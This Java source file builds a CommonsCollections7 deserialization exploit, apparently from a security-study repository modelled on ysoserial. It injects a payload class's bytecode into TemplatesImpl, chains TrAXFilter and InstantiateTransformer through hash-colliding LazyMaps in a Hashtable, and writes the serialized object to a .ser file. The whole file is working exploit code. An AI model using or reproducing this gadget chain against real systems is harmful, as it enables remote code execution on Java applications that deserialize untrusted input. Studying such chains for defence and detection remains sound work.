package CommonsCollections7;

import CommonsCollections4.payload;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import javassist.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

public class exp1 {
    public static void main(String[] args) throws IOException, CannotCompileException, NotFoundException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
        TemplatesImpl tmp = new TemplatesImpl();
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(payload.class));
        CtClass pay_class = pool.get(payload.class.getName());
        byte[] payCode = pay_class.toBytecode();
        Class clazz;
        clazz =Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        //存储payload类
        Field byteCode = clazz.getDeclaredField("_bytecodes");
        byteCode.setAccessible(true);
        byteCode.set(tmp,new byte[][]{payCode});
        Field name  = clazz.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(tmp,"tr1ple");


        Transformer[] trans = new Transformer[]{
                null,
                null
        };

        ChainedTransformer chain = new ChainedTransformer(trans);

        //构造两个hash值相同的lazymap
        Map innerMap1 = new HashMap();
        Map innerMap2 = new HashMap();

        Map lazyMap1 = LazyMap.decorate(innerMap1,chain);
        lazyMap1.put("zZ",1);

        Map lazyMap2 = LazyMap.decorate(innerMap2, chain);
        lazyMap2.put("yy",1);

        Hashtable hashTable = new Hashtable();
        hashTable.put(lazyMap1,1);
        hashTable.put(lazyMap2,2);

        lazyMap2.remove("zZ");

        Transformer[] trans1 = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(
                        new Class[]{Templates.class},
                        new Object[]{tmp}
                )
        };
        clazz = ChainedTransformer.class;
        Field itrans = clazz.getDeclaredField("iTransformers");
        itrans.setAccessible(true);
        itrans.set(chain,trans1);



        //序列化
        File file;
        file = new File(System.getProperty("user.dir")+"/javasec-ysoserial/src/main/resources/commonscollections7-2.ser");
        ObjectOutputStream obj = new ObjectOutputStream(new FileOutputStream(file));
        obj.writeObject(hashTable);

    }
}
